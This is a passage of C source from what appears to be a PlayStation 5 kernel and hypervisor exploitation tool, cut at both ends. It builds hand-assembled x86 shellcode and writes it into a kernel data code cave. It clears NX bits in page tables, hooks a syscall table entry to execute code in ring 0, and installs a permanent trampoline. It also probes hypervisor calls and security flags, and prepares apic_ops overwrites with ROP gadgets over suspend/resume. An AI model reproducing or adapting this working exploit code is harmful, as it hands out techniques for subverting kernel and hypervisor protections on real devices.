                    int wb_sc_len = build_ring0_apic_writeback_shellcode(
                        wb_sc, sizeof(wb_sc), result_kva,
                        slot0_dmap, slot2_dmap);
                    printf("[*] Writeback test shellcode: %d bytes\n", wb_sc_len);

                    if (wb_sc_len <= 0 || wb_sc_len > 480) {
                        printf("[-] Shellcode too large or failed to build.\n");
                    } else {
                        /* Clear shared buffer */
                        uint8_t zero_buf2[256];
                        memset(zero_buf2, 0, sizeof(zero_buf2));
                        for (int zb = 0; zb < KMOD_RESULT_ALLOC_SIZE; zb += 256)
                            kernel_copyin(zero_buf2, g_dmap_base + cpu_pa + zb, 256);

                        /* Save and write shellcode to kdata cave */
                        uint8_t wb_backup[512];
                        kernel_copyout(g_dmap_base + target_pa, wb_backup, wb_sc_len);
                        printf("[*] Writing shellcode to kdata code cave...\n");
                        kernel_copyin(wb_sc, g_dmap_base + target_pa, wb_sc_len);

                        /* Verify write */
                        uint8_t wb_verify[512];
                        kernel_copyout(g_dmap_base + target_pa, wb_verify, wb_sc_len);
                        int wb_match = (memcmp(wb_sc, wb_verify, wb_sc_len) == 0);
                        printf("    Write verify: %s\n", wb_match ? "OK" : "MISMATCH");
                        fflush(stdout);

                        if (wb_match) {
                            /* Clear NX+G in PTE */
                            printf("[*] Clearing NX+G in PTE...\n");
                            kernel_copyin(&new_pte, g_dmap_base + pte_pa, 8);

                            /* Hook sysent[253] */
                            printf("[*] Hooking sysent[253] → kdata_base...\n");
                            kernel_copyin(&target_kva, g_dmap_base + s253_call_pa, 8);
                            kernel_copyin(&narg_zero, g_dmap_base + s253_narg_pa, 4);

                            /* Execute writeback test in ring 0 */
                            printf("[*] Calling syscall(253) — apic_ops writeback test in ring 0...\n");
                            fflush(stdout);
                            errno = 0;
                            long wb_ret = syscall(253);
                            int wb_err = errno;
                            printf("    syscall(253) returned: %ld, errno=%d\n",
                                   wb_ret, wb_err);

                            /* Restore everything immediately */
                            printf("[*] Restoring PTE, sysent, code cave...\n");
                            kernel_copyin(s253_orig, g_dmap_base + s253_pa, SYSENT_STRIDE);
                            kernel_copyin(&orig_pte, g_dmap_base + pte_pa, 8);
                            kernel_copyin(wb_backup, g_dmap_base + target_pa, wb_sc_len);
                            printf("    All restored.\n\n");
                            fflush(stdout);

                            /* Parse results */
                            struct kmod_result_buf wb_results;
                            memcpy(&wb_results, result_vaddr, sizeof(wb_results));

                            if (wb_results.magic == KMOD_MAGIC &&
                                wb_results.status == KMOD_STATUS_DONE) {
                                /* Extract results from buffer offsets */
                                uint64_t original_val, slot0_val;
                                uint64_t t1_readback, t2_readback, restore_rb;
                                uint32_t t1_ok, t2_ok, restore_ok;
                                memcpy(&original_val, (uint8_t*)result_vaddr + 32, 8);
                                memcpy(&slot0_val, (uint8_t*)result_vaddr + 40, 8);
                                memcpy(&t1_readback, (uint8_t*)result_vaddr + 48, 8);
                                memcpy(&t1_ok, (uint8_t*)result_vaddr + 56, 4);
                                memcpy(&t2_readback, (uint8_t*)result_vaddr + 64, 8);
                                memcpy(&t2_ok, (uint8_t*)result_vaddr + 72, 4);
                                memcpy(&restore_rb, (uint8_t*)result_vaddr + 80, 8);
                                memcpy(&restore_ok, (uint8_t*)result_vaddr + 88, 4);

                                printf("[+] apic_ops[2] (xapic_mode) = 0x%016lx\n",
                                       (unsigned long)original_val);
                                printf("[+] apic_ops[0] (create)     = 0x%016lx\n",
                                       (unsigned long)slot0_val);

                                printf("\n[*] Test 1: Same-value writeback\n");
                                printf("    Wrote:    0x%016lx → apic_ops[2]\n",
                                       (unsigned long)original_val);
                                printf("    Readback: 0x%016lx\n",
                                       (unsigned long)t1_readback);
                                if (t1_ok) {
                                    printf("[+] TEST 1 PASSED — same-value write OK\n");
                                } else {
                                    printf("[-] TEST 1 FAILED — readback mismatch!\n");
                                    printf("    CFI or HV may be blocking writes.\n");
                                }

                                printf("\n[*] Test 2: Cross-type write (slot0 → slot2)\n");
                                printf("    Wrote:    0x%016lx → apic_ops[2]\n",
                                       (unsigned long)slot0_val);
                                printf("    Readback: 0x%016lx\n",
                                       (unsigned long)t2_readback);
                                if (t2_ok) {
                                    printf("[+] TEST 2 PASSED — cross-type write OK!\n");
                                    printf("    apic_ops[2] can be overwritten with arbitrary ktext ptr.\n");
                                } else {
                                    printf("[-] TEST 2 FAILED — cross-type write blocked!\n");
                                    printf("    HV or CFI may enforce pointer types.\n");
                                }

                                printf("\n[*] Restore verification:\n");
                                printf("    Readback: 0x%016lx\n",
                                       (unsigned long)restore_rb);
                                if (restore_ok) {
                                    printf("[+] RESTORE OK — original value confirmed\n");
                                } else {
                                    printf("[!] RESTORE MISMATCH — apic_ops may be corrupted!\n");
                                }

                                if (t1_ok && t2_ok && restore_ok) {
                                    printf("\n[+] ============================================\n");
                                    printf("[+]  APIC_OPS WRITABLE — READY FOR FLATZ METHOD\n");
                                    printf("[+] ============================================\n");
                                    printf("[+] apic_ops[2] (xapic_mode) can be overwritten.\n");
                                    printf("[+] Next: overwrite with ROP gadget, trigger suspend/resume.\n");
                                    printf("[+] Target address: 0x%lx\n",
                                           (unsigned long)(apic_ops_addr + 0x10));
                                }
                            } else if (wb_err != 0) {
                                printf("[-] Writeback test CRASHED (errno=%d)\n", wb_err);
                                printf("    The HV may trap writes to apic_ops.\n");
                            } else {
                                printf("[-] Writeback test did not complete.\n");
                                printf("    Magic: 0x%lx, Status: %u\n",
                                       (unsigned long)wb_results.magic,
                                       wb_results.status);
                            }
                        } else {
                            /* Restore on verify failure */
                            kernel_copyin(wb_backup, g_dmap_base + target_pa, wb_sc_len);
                        }
                    }
                    } /* end apic_pa valid check */
                    printf("\n");
                    fflush(stdout);
                }

                /* ─── Phase 5b: kdata Cave Trampoline (fallback) ───
                 *
                 * If the kmod trampoline scanner failed (module pages are
                 * NPT-protected against DMAP reads), we build a self-contained
                 * trampoline_xapic_mode function directly in the kdata code cave.
                 *
                 * We've already proven:
                 *   - NPT allows execution on kdata pages (X bit set in NPT)
                 *   - Guest PTE NX-clear makes kdata executable (ring-0 test passed)
                 *   - kdata cave at kdata_base is writable via DMAP
                 *
                 * The trampoline is 56 bytes: 40 bytes of code + 8 bytes for
                 * g_trampoline_target + 8 bytes for proof_marker_addr.
                 * Placed at kdata_base + 0x100 (after the Phase 7
                 * persistence marker at kdata_base + 0x00..0x3F).
                 *
                 * The trampoline writes a "FIRED" proof marker (0x4649524544215F21)
                 * to kdata_base + 0x20 via a DMAP-mapped address stored at
                 * proof_marker_addr.  This lets us detect whether the trampoline
                 * was actually called during resume.
                 *
                 * Machine code:
                 *   push rcx                    ; save clobbered regs
                 *   push rdx
                 *   mov rcx, [rip+proof_off]    ; load proof DMAP address
                 *   test rcx, rcx               ; NULL check
                 *   jz .skip_proof
                 *   movabs rdx, 0x4649524544215F21  ; "FIRED!_!" magic
                 *   mov [rcx], rdx              ; write proof to kdata cave
                 * .skip_proof:
                 *   pop rdx                     ; restore regs
                 *   pop rcx
                 *   mov rax, [rip+target_off]   ; load g_trampoline_target
                 *   test rax, rax               ; NULL check
                 *   jz .fallback                ; if NULL, return 1
                 *   jmp rax                     ; tail-call original xapic_mode
                 * .fallback:
                 *   mov eax, 1                  ; APIC_MODE_XAPIC
                 *   ret
                 * g_trampoline_target:
                 *   .quad 0               ; patched by Phase 7 with original xapic
                 * g_proof_marker_addr:
                 *   .quad 0               ; patched with DMAP addr of kdata+0x20
                 */
                #define CAVE_TRAMP_OFFSET     0x100  /* offset within kdata_base page */
                #define CAVE_TRAMP_TARGET_OFF 56     /* offset to g_trampoline_target */
                #define CAVE_TRAMP_PROOF_OFF  64     /* offset to g_proof_marker_addr */
                #define CAVE_TRAMP_CODE_SZ    56     /* bytes of code + int3 padding */
                #define CAVE_TRAMP_TOTAL      72     /* code + 8-byte target + 8-byte proof addr */
                #define CAVE_PROOF_MARKER     0x4649524544215F21ULL  /* "FIRED!_!" */
                #define CAVE_PROOF_OFFSET     0x20   /* kdata_base+0x20 = proof location */

                if (!g_kmod_trampoline_func) {
                    printf("=============================================\n");
                    printf("  Phase 5b: kdata Cave Trampoline (fallback)\n");
                    printf("=============================================\n\n");
                    printf("[*] Kmod trampoline unavailable — building in kdata cave.\n");
                    fflush(stdout);

                    /*
                     * Build trampoline with proof marker + original call-through.
                     * All RIP-relative offsets computed from instruction position.
                     */
                    uint8_t cave_tramp_code[CAVE_TRAMP_TOTAL];
                    int p = 0;

                    /* push rcx */
                    cave_tramp_code[p++] = 0x51;
                    /* push rdx */
                    cave_tramp_code[p++] = 0x52;
                    /* mov rcx, [rip+disp32] — load proof_marker_addr
                     * RIP after this instruction = p+7, target at CAVE_TRAMP_PROOF_OFF
                     * disp = CAVE_TRAMP_PROOF_OFF - (p+7) */
                    cave_tramp_code[p++] = 0x48; cave_tramp_code[p++] = 0x8b;
                    cave_tramp_code[p++] = 0x0d;
                    {
                        int32_t disp = CAVE_TRAMP_PROOF_OFF - (p + 4);
                        memcpy(&cave_tramp_code[p], &disp, 4); p += 4;
                    }
                    /* test rcx, rcx */
                    cave_tramp_code[p++] = 0x48; cave_tramp_code[p++] = 0x85;
                    cave_tramp_code[p++] = 0xc9;
                    /* jz .skip_proof (+12 bytes: movabs=10 + mov [rcx],rdx=3 - 1) */
                    cave_tramp_code[p++] = 0x74;
                    cave_tramp_code[p++] = 0x0d; /* skip 13 bytes */
                    /* movabs rdx, CAVE_PROOF_MARKER (10 bytes) */
                    cave_tramp_code[p++] = 0x48; cave_tramp_code[p++] = 0xba;
                    {
                        uint64_t magic = CAVE_PROOF_MARKER;
                        memcpy(&cave_tramp_code[p], &magic, 8); p += 8;
                    }
                    /* mov [rcx], rdx (3 bytes) */
                    cave_tramp_code[p++] = 0x48; cave_tramp_code[p++] = 0x89;
                    cave_tramp_code[p++] = 0x11;
                    /* .skip_proof: pop rdx */
                    cave_tramp_code[p++] = 0x5a;
                    /* pop rcx */
                    cave_tramp_code[p++] = 0x59;
                    /* mov rax, [rip+disp32] — load g_trampoline_target
                     * RIP after = p+7, target at CAVE_TRAMP_TARGET_OFF */
                    cave_tramp_code[p++] = 0x48; cave_tramp_code[p++] = 0x8b;
                    cave_tramp_code[p++] = 0x05;
                    {
                        int32_t disp = CAVE_TRAMP_TARGET_OFF - (p + 4);
                        memcpy(&cave_tramp_code[p], &disp, 4); p += 4;
                    }
                    /* test rax, rax */
                    cave_tramp_code[p++] = 0x48; cave_tramp_code[p++] = 0x85;
                    cave_tramp_code[p++] = 0xc0;
                    /* jz +2 */
                    cave_tramp_code[p++] = 0x74; cave_tramp_code[p++] = 0x02;
                    /* jmp rax */
                    cave_tramp_code[p++] = 0xff; cave_tramp_code[p++] = 0xe0;
                    /* mov eax, 1 */
                    cave_tramp_code[p++] = 0xb8; cave_tramp_code[p++] = 0x01;
                    cave_tramp_code[p++] = 0x00; cave_tramp_code[p++] = 0x00;
                    cave_tramp_code[p++] = 0x00;
                    /* ret */
                    cave_tramp_code[p++] = 0xc3;
                    /* Pad to CAVE_TRAMP_CODE_SZ if needed */
                    while (p < CAVE_TRAMP_CODE_SZ)
                        cave_tramp_code[p++] = 0xcc; /* int3 padding */
                    /* g_trampoline_target (8 bytes, initialized to 0) */
                    memset(&cave_tramp_code[p], 0, 8); p += 8;
                    /* g_proof_marker_addr (8 bytes, initialized to 0) */
                    memset(&cave_tramp_code[p], 0, 8); p += 8;

                    printf("[*] Cave trampoline: %d bytes (%d code + %d data)\n",
                           p, CAVE_TRAMP_CODE_SZ,
                           p - CAVE_TRAMP_CODE_SZ);

                    uint64_t tramp_cave_kva = target_kva + CAVE_TRAMP_OFFSET;
                    uint64_t tramp_cave_pa  = target_pa + CAVE_TRAMP_OFFSET;

                    /* Write trampoline to kdata cave via DMAP */
                    printf("[*] Writing trampoline to kdata+0x%x (KVA=0x%lx, PA=0x%lx)...\n",
                           CAVE_TRAMP_OFFSET,
                           (unsigned long)tramp_cave_kva,
                           (unsigned long)tramp_cave_pa);
                    kernel_copyin((void *)cave_tramp_code,
                                  g_dmap_base + tramp_cave_pa,
                                  CAVE_TRAMP_TOTAL);

                    /* Verify write */
                    uint8_t tramp_verify[CAVE_TRAMP_TOTAL];
                    kernel_copyout(g_dmap_base + tramp_cave_pa,
                                   tramp_verify, CAVE_TRAMP_TOTAL);
                    int tramp_ok = (memcmp(cave_tramp_code, tramp_verify,
                                           CAVE_TRAMP_TOTAL) == 0);
                    printf("    Write verify: %s\n", tramp_ok ? "OK" : "MISMATCH");

                    if (tramp_ok) {
                        /* Clear NX+G in guest PTE for kdata_base page — PERMANENT.
                         * This makes the page executable for the trampoline.
                         * NPT already allows X on this PA (confirmed by ring-0 test). */
                        uint64_t new_pte = orig_pte & ~((1ULL << 63) | (1ULL << 8));
                        kernel_copyin(&new_pte, g_dmap_base + pte_pa, 8);

                        uint64_t pte_readback = 0;
                        kernel_copyout(g_dmap_base + pte_pa, &pte_readback, 8);
                        printf("[*] Guest PTE NX cleared (permanent): 0x%016lx [%s]\n",
                               (unsigned long)pte_readback,
                               pte_readback == new_pte ? "OK" : "FAIL");

                        if (pte_readback == new_pte) {
                            g_kmod_trampoline_func = tramp_cave_kva;
                            g_kmod_trampoline_target = tramp_cave_kva +
                                                       CAVE_TRAMP_TARGET_OFF;

                            /*
                             * NOTE: proof marker DMAP write DISABLED.
                             * g_proof_marker_addr left as 0 in the trampoline.
                             * The trampoline's test rcx,rcx;jz skips the write.
                             *
                             * The DMAP write (same physical page as executing
                             * code) may trigger x86 self-modifying code machine
                             * clears during LAPIC suspend, causing kernel panic.
                             * We'll detect trampoline firing by checking whether
                             * apic_ops[2] still points to the cave trampoline
                             * after resume instead.
                             */
                            (void)0; /* proof marker patching disabled */

                            printf("\n[+] ============================================\n");
                            printf("[+]  CAVE TRAMPOLINE INSTALLED\n");
                            printf("[+] ============================================\n");
                            printf("[+] trampoline_xapic_mode() = 0x%016lx\n",
                                   (unsigned long)g_kmod_trampoline_func);
                            printf("[+] g_trampoline_target     = 0x%016lx\n",
                                   (unsigned long)g_kmod_trampoline_target);
                            printf("[+] Proof marker write:     DISABLED (SMC safety)\n");
                            printf("[+] Guest PTE NX permanently cleared for this page.\n");
                            printf("[+] Phase 7 can now arm apic_ops[2] hook.\n");
                        } else {
                            printf("[-] PTE write failed — trampoline NOT installed.\n");
                        }
                    } else {
                        printf("[-] Trampoline write verify failed.\n");
                    }
                    printf("\n");
                    fflush(stdout);
                }
            } else if (buf_check != 0) {
                printf("[?] Buffer has unexpected value: 0x%lx\n",
                       (unsigned long)buf_check);
                printf("    Partial execution or different code path.\n");
            } else {
                printf("[-] Buffer still zero — shellcode did not execute.\n");
                if (r0_err != 0) {
                    printf("    errno=%d suggests a fault occurred.\n", r0_err);
                    printf("    Likely: stale TLB entry with NX=1.\n");
                    printf("    Need: invlpg or CR4.PGE toggle to flush.\n");
                } else {
                    printf("    But no error either — investigate.\n");
                }
            }
            printf("\n");
            fflush(stdout);
        }

r0_skip: ;

idt_done: ;
idt_skip: ;
    }

    if (results->magic != KMOD_MAGIC) {
        printf("[-] Result buffer magic mismatch: expected 0x%llx, got 0x%llx\n",
               (unsigned long long)KMOD_MAGIC, (unsigned long long)results->magic);

        if (first_qword == 0xAAAABBBBCCCCDDDDULL) {
            printf("[!] Pre-campaign CANARY found! hv_init() DID execute.\n");
            printf("    g_output_kva is correct, but campaign or copy crashed.\n");
            printf("    Try disabling VMMCALL campaigns (set RUN_VMMCALL_ENUM=0).\n");
        } else if (first_qword == 0) {
            printf("[!] Buffer still all zeros after all init paths.\n");
            printf("    Possible causes:\n");
            printf("    - kldstat returned wrong base (relocs not applied)\n");
            printf("    - IDT hook didn't reach trampoline\n");
            printf("    - HV trapped execution from module pages\n");
        } else {
            printf("[!] Unexpected first qword: 0x%llx\n",
                   (unsigned long long)first_qword);
        }

        /* kldsym diagnostic */
        printf("\n[*] Diagnostic: trying kldsym...\n");
        struct kld_sym_lookup sym;
        memset(&sym, 0, sizeof(sym));
        sym.version = sizeof(struct kld_sym_lookup);
        sym.symname = "hv_results";
        ret = syscall(SYS_kldsym, kid, KLDSYM_LOOKUP, &sym);
        printf("    kldsym ret=%d, symvalue=0x%lx, symsize=%lu\n",
               ret, (unsigned long)sym.symvalue, (unsigned long)sym.symsize);

        /* kernel_copyout diagnostic */
        printf("    Trying kernel_copyout from DMAP KVA 0x%lx...\n",
               (unsigned long)result_kva);
        struct kmod_result_buf kc_results;
        kernel_copyout(result_kva, &kc_results, sizeof(kc_results));
        printf("    kernel_copyout magic: 0x%llx\n",
               (unsigned long long)kc_results.magic);
    } else {
        printf("[+] KMOD_MAGIC found! Shared memory communication working!\n");
        printf("[+] Kmod status: %s\n",
               results->status == KMOD_STATUS_DONE ? "COMPLETE" :
               results->status == KMOD_STATUS_RUNNING ? "STILL RUNNING (crashed?)" :
               "UNKNOWN");

        /* Display MSR results */
        if (results->num_msr_results > 0) {
            printf("\n[+] MSR/CR Reconnaissance Results (%u entries):\n",
                   results->num_msr_results);
            for (uint32_t i = 0; i < results->num_msr_results && i < 32; i++) {
                uint32_t msr_id = results->msr_results[i].msr_id;
                uint64_t value  = results->msr_results[i].value;
                const char *name = "";

                switch (msr_id) {
                    case 0xC0000080: name = "EFER"; break;
                    case 0xC0000081: name = "STAR"; break;
                    case 0xC0000082: name = "LSTAR"; break;
                    case 0xC0000084: name = "SFMASK"; break;
                    case 0xC0000100: name = "FS_BASE"; break;
                    case 0xC0000101: name = "GS_BASE"; break;
                    case 0xC0000102: name = "KGS_BASE"; break;
                    case 0xC0000103: name = "TSC_AUX"; break;
                    case 0xFFFF0000: name = "CR0"; break;
                    case 0xFFFF0003: name = "CR3"; break;
                    case 0xFFFF0004: name = "CR4"; break;
                    default: name = "???"; break;
                }
                printf("    %-10s (0x%08x) = 0x%016lx\n", name, msr_id, value);
            }
        }

        /* Display VMMCALL results */
        if (results->num_results > 0) {
            printf("\n[+] VMMCALL Enumeration Results (%u entries):\n", results->num_results);
            printf("    %-6s %-18s %-18s %-18s %-10s %-4s\n",
                   "RAX_in", "RAX_out", "RCX_out", "RDX_out", "Campaign", "OK");
            printf("    %-6s %-18s %-18s %-18s %-10s %-4s\n",
                   "------", "------------------", "------------------",
                   "------------------", "----------", "----");

            for (uint32_t i = 0; i < results->num_results && i < KMOD_MAX_RESULTS; i++) {
                const struct vmmcall_result *r = &results->results[i];
                printf("    0x%04lx 0x%016lx 0x%016lx 0x%016lx  camp=%u     %s\n",
                       (unsigned long)r->rax_in, (unsigned long)r->rax_out,
                       (unsigned long)r->rcx_out, (unsigned long)r->rdx_out,
                       r->campaign_id, r->survived ? "YES" : "NO");
            }
        } else if (results->status == KMOD_STATUS_RUNNING) {
            printf("\n[-] No VMMCALL results. Module init appears to have crashed during:\n");
            printf("    Campaign %u, probe %u\n",
                   results->current_campaign, results->current_probe);
        }
    }

    /* Check Phase 7 trampoline status */
    printf("\n[*] Phase 7 trampoline address status:\n");
    if (g_kmod_trampoline_func && g_kmod_trampoline_target) {
        printf("    [OK] Addresses available.\n");
        printf("    trampoline_xapic_mode() = 0x%016lx\n",
               (unsigned long)g_kmod_trampoline_func);
        printf("    g_trampoline_target     = 0x%016lx\n",
               (unsigned long)g_kmod_trampoline_target);
    } else {
        /* Last-resort: try result buffer (with RIP-relative LEA fix,
         * these should be non-zero when SYSINIT has fired). */
        printf("    Addresses not set from primary path.\n");
        printf("    Trying result buffer...\n");
        printf("    results->trampoline_func_kva  = 0x%lx\n",
               (unsigned long)results->trampoline_func_kva);
        printf("    results->trampoline_target_kva = 0x%lx\n",
               (unsigned long)results->trampoline_target_kva);
        if (results->trampoline_func_kva != 0 && results->trampoline_target_kva != 0) {
            g_kmod_trampoline_func = results->trampoline_func_kva;
            g_kmod_trampoline_target = results->trampoline_target_kva;
            g_kmod_kid = kid;
            printf("    [OK] Got addresses from result buffer.\n");
        } else {
            printf("    [-] Result buffer also has zeros.\n");
        }
    }

    /* gp_handler KVA: check globals first (set via result buffer or scanner),
     * then try result buffer fallback. */
    printf("\n[*] Phase 9 gp_handler status:\n");
    if (g_kmod_gp_handler) {
        printf("    [OK] gp_handler = 0x%016lx\n",
               (unsigned long)g_kmod_gp_handler);
    } else {
        printf("    [-] gp_handler not set from primary path.\n");
        printf("    results->gp_handler_kva = 0x%016lx\n",
               (unsigned long)results->gp_handler_kva);
        if (results->gp_handler_kva != 0) {
            g_kmod_gp_handler = results->gp_handler_kva;
            printf("    [OK] Using result buffer value: 0x%016lx\n",
                   (unsigned long)g_kmod_gp_handler);
        } else {
            printf("    [-] gp_handler unavailable — Phase 9 will use cave fallback.\n");
        }
    }

    /* Step 5: Unload the module (skip if Phase 7 needs it) */
    if (g_kmod_kid > 0) {
        printf("\n[*] Step 5: Skipping kldunload — module needed for Phase 7 trampoline.\n");
        printf("    Module kid=%d remains loaded in kernel memory.\n", kid);
    } else {
        printf("\n[*] Step 5: Unloading kernel module...\n");
        ret = syscall(SYS_kldunload, kid);
        if (ret < 0) {
            printf("[!] kldunload failed: errno=%d (%s)\n", errno, strerror(errno));
            printf("    Module may still be loaded in kernel memory.\n");
        } else {
            printf("[+] Module unloaded successfully.\n");
        }
    }

    /* Clean up the .ko file */
    unlink("/data/etaHEN/hv_kmod.ko");

    notify("[HV Research] Kmod kldload campaign complete!");
}

/* ─── Phase 6: Flatz suspend/resume setup ─── */
/*
 * This campaign implements two phases of the flatz method:
 *
 * Phase 6a: Clear XOTEXT bit (Sony bit 58) and set RW on all ktext
 *           guest page table entries.  This prepares for suspend/resume:
 *           when the HV reinitializes after resume, it reads these PTEs
 *           and won't apply execute-only protection in the NPT.
 *
 * Phase 6b: Test whether ktext is readable via DMAP.  On first run
 *           (before suspend), this will FAIL (XOM still enforced by NPT).
 *           After suspend/resume (second run), this should SUCCEED,
 *           allowing us to scan ktext for ROP gadgets.
 *
 * The user must manually enter rest mode between runs:
 *   Run 1: hv_research.elf → clears XOTEXT → "enter rest mode now"
 *   Run 2: hv_research.elf → ktext readable → gadget scan
 */

/* PTE bit definitions for PS5 (AMD64 + Sony extensions) */
#define PTE_BIT_RW          (1ULL << 1)
#define PTE_BIT_XOTEXT      (1ULL << 58)   /* Sony: execute-only text */
#define PTE_BIT_NX          (1ULL << 63)

/* Gadget patterns to search for in ktext */
struct gadget_pattern {
    const char *name;
    const uint8_t *bytes;
    int len;
    int useful;     /* 1 = immediately useful, 0 = informational */
};
static void campaign_flatz_setup(void) {
    printf("\n=============================================\n");
    printf("  Phase 6: Flatz Suspend/Resume Setup\n");
    printf("=============================================\n\n");

    if (!g_dmap_base || !g_cr3_phys || !g_ktext_base) {
        printf("[-] Missing prerequisites (DMAP=0x%lx, CR3=0x%lx, ktext=0x%lx)\n",
               (unsigned long)g_dmap_base, (unsigned long)g_cr3_phys,
               (unsigned long)g_ktext_base);
        return;
    }

    /* ─── Phase 6a: Diagnose ktext PTEs + QA flags approach ─── */
    printf("[*] Phase 6a: ktext page table analysis + XOTEXT/QA flags\n");
    printf("    ktext base: 0x%lx\n", (unsigned long)g_ktext_base);
    fflush(stdout);

    /*
     * Scan range: 32MB from ktext_base (matches Phase 3 ktext_size).
     * This covers all kernel .text including late LAPIC functions.
     */
    uint64_t ktext_scan_size = 0x2000000;  /* 32MB */
    uint64_t ktext_end = g_ktext_base + ktext_scan_size;

    /*
     * Step 1: Dump the first 8 PDE/PTE entries for ktext to understand
     * the page mapping structure and which bits are set.
     */
    printf("\n[*] Dumping ktext page table entries (first 8 regions):\n");
    int diag_count = 0;
    int total_2mb_pages = 0;
    int total_4kb_pages = 0;
    int total_unmapped = 0;
    int total_xotext = 0;
    int total_rw = 0;
    int total_nx = 0;

    for (uint64_t va = g_ktext_base; va < ktext_end && va >= g_ktext_base; ) {
        uint64_t pml4_idx = (va >> 39) & 0x1FF;
        uint64_t pdp_idx  = (va >> 30) & 0x1FF;
        uint64_t pd_idx   = (va >> 21) & 0x1FF;
        uint64_t pt_idx   = (va >> 12) & 0x1FF;

        /* PML4E */
        uint64_t pml4e = 0;
        kernel_copyout(g_dmap_base + g_cr3_phys + pml4_idx * 8, &pml4e, 8);
        if (!(pml4e & PTE_PRESENT)) {
            total_unmapped++;
            va += 0x1000;
            continue;
        }

        /* PDPE */
        uint64_t pdpe_pa = (pml4e & PTE_PA_MASK) + pdp_idx * 8;
        uint64_t pdpe = 0;
        kernel_copyout(g_dmap_base + pdpe_pa, &pdpe, 8);
        if (!(pdpe & PTE_PRESENT)) {
            total_unmapped++;
            va += 0x1000;
            continue;
        }
        if (pdpe & PTE_PS) {
            /* 1GB giant page */
            if (diag_count < 8) {
                printf("    VA 0x%lx: 1GB PDPE=0x%016lx P=%d RW=%d NX=%d bit58=%d\n",
                       (unsigned long)va, (unsigned long)pdpe,
                       (int)(pdpe & 1), (int)((pdpe >> 1) & 1),
                       (int)(pdpe >> 63), (int)((pdpe >> 58) & 1));
                diag_count++;
            }
            if (pdpe & PTE_BIT_XOTEXT) total_xotext++;
            if (pdpe & PTE_BIT_RW) total_rw++;
            if (pdpe & PTE_BIT_NX) total_nx++;
            va = (va + (1ULL << 30)) & ~((1ULL << 30) - 1);
            continue;
        }

        /* PDE */
        uint64_t pde_pa = (pdpe & PTE_PA_MASK) + pd_idx * 8;
        uint64_t pde = 0;
        kernel_copyout(g_dmap_base + pde_pa, &pde, 8);
        if (!(pde & PTE_PRESENT)) {
            total_unmapped++;
            va += 0x1000;
            continue;
        }
        if (pde & PTE_PS) {
            /* 2MB huge page */
            total_2mb_pages++;
            if (diag_count < 8) {
                printf("    VA 0x%lx: 2MB PDE=0x%016lx P=%d RW=%d NX=%d bit58=%d\n",
                       (unsigned long)va, (unsigned long)pde,
                       (int)(pde & 1), (int)((pde >> 1) & 1),
                       (int)(pde >> 63), (int)((pde >> 58) & 1));
                diag_count++;
            }
            if (pde & PTE_BIT_XOTEXT) total_xotext++;
            if (pde & PTE_BIT_RW) total_rw++;
            if (pde & PTE_BIT_NX) total_nx++;
            va = (va + (1ULL << 21)) & ~((1ULL << 21) - 1);
            continue;
        }

        /* PTE (4KB page) */
        uint64_t pte_pa = (pde & PTE_PA_MASK) + pt_idx * 8;
        uint64_t pte = 0;
        kernel_copyout(g_dmap_base + pte_pa, &pte, 8);
        if (!(pte & PTE_PRESENT)) {
            total_unmapped++;
            va += 0x1000;
            continue;
        }

        total_4kb_pages++;
        if (diag_count < 8) {
            printf("    VA 0x%lx: 4KB PTE=0x%016lx P=%d RW=%d NX=%d bit58=%d\n",
                   (unsigned long)va, (unsigned long)pte,
                   (int)(pte & 1), (int)((pte >> 1) & 1),
                   (int)(pte >> 63), (int)((pte >> 58) & 1));
            diag_count++;
        }
        if (pte & PTE_BIT_XOTEXT) total_xotext++;
        if (pte & PTE_BIT_RW) total_rw++;
        if (pte & PTE_BIT_NX) total_nx++;
        va += 0x1000;
    }

    printf("\n[*] ktext page table summary (32MB scan):\n");
    printf("    2MB huge pages:     %d\n", total_2mb_pages);
    printf("    4KB pages:          %d\n", total_4kb_pages);
    printf("    Unmapped:           %d\n", total_unmapped);
    printf("    XOTEXT bit set:     %d\n", total_xotext);
    printf("    RW bit set:         %d\n", total_rw);
    printf("    NX bit set:         %d\n", total_nx);
    fflush(stdout);

    /*
     * Step 2: XOTEXT analysis (READ-ONLY — no modifications).
     *
     * Previously we cleared XOTEXT (bit 58) on all ktext guest PTEs.
     * This caused a critical problem: the HV integrity monitor detects
     * modified guest PTEs during the suspend process, preventing the
     * PS5 from entering rest mode (white light flashes indefinitely).
     *
     * Since XOM is enforced via NPT (not guest PTEs), clearing XOTEXT
     * in guest PTEs doesn't help anyway.  We now only report the count.
     */
    int pte_modified = 0, pde_modified = 0;
    (void)pte_modified; (void)pde_modified;

    if (total_xotext > 0) {
        printf("\n[*] XOTEXT found in %d guest PTEs.\n", total_xotext);
        printf("    NOT clearing — HV integrity monitor detects modified PTEs\n");
        printf("    and prevents rest mode (suspend hangs with flashing white light).\n");
        printf("    XOM is enforced via NPT anyway, so clearing has no effect.\n");
    } else {
        printf("\n[!] No XOTEXT bits found in guest PTEs.\n");
        printf("    FW 4.03 enforces XOM purely via HV Nested Page Tables.\n");
        printf("    Guest PTE manipulation alone cannot disable XOM.\n");
    }
    fflush(stdout);

    /*
     * Step 3: QA/Security flags analysis.
     *
     * IMPORTANT CONTEXT (from fw403-hv-attack-surface-analysis.md):
     *   FW <= 2.70: QA flags shared between HV and kernel, NOT
     *               reinitialized on resume.  Setting SL debug flag
     *               + sleep/wake → ktext readable+writable.
     *   FW >= 3.00: QA flags REINITIALIZED on resume by secure loader.
     *               Sleep/wake trick no longer works.
     *               Guest PTE XOTEXT clearing has no NPT effect.
     *
     * We still dump and set QA flags to verify this experimentally.
     * The SDK provides kernel_set_qaflags()/kernel_get_qaflags()
     * which handle the FW-specific offset automatically.
     */
    printf("\n[*] Step 3: QA/Security flags (experimental verification)\n");
    printf("    NOTE: QA flags are REINITIALIZED on resume on FW >= 3.00.\n");
    printf("    This test verifies whether that patch holds on FW 4.03.\n\n");

    /* Read current QA flags via SDK API */
    uint8_t qa_before[16] = {0};
    if (kernel_get_qaflags(qa_before) == 0) {
        printf("[*] QA_FLAGS (via SDK, KERNEL_ADDRESS_QA_FLAGS):\n");
        printf("    Current: ");
        for (int i = 0; i < 16; i++) printf("%02x ", qa_before[i]);
        printf("\n");
    } else {
        printf("[-] kernel_get_qaflags() failed\n");
    }

    /* Read security flags */
    if (KERNEL_ADDRESS_SECURITY_FLAGS) {
        uint8_t secflags[16] = {0};
        kernel_copyout(KERNEL_ADDRESS_SECURITY_FLAGS, secflags, 16);
        printf("[*] SECURITY_FLAGS:\n");
        printf("    Current: ");
        for (int i = 0; i < 16; i++) printf("%02x ", secflags[i]);
        printf("\n");
    }
